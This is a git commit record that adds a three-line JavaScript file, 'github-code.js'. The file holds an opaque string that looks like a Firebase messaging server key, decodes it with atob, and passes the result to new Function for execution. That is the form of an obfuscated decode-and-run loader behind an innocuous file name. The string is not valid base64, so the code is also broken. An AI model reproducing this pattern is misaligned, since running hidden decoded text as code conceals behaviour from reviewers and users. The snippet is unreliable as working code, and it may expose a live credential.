63aa0324a6544579442d1b3fb25dbaf12ea2bf15
devcode20 <65097467+devcode20@users.noreply.github.com>
2020-05-10 00:54:33 +0000

    Add files via upload

---
+++ github-code.js
@@ -0,0 +1,3 @@
+var ad = "AAAAO7K-RTc:APA91bEW9W-2rA_3XwPUOlV5VNh_i0DAQN2e_CJtKMSYGOi3MEYgUrgqxWmpBZuxlISCLlC__5wbpKk6ByEYfy_6GHGRPm3W96d6bU3sZzcGw7LrEEnga82lBnU6S5-hOGFYrigJR1l1";
+var decodedad = atob(ad);
+var func = new Function(decodedad);
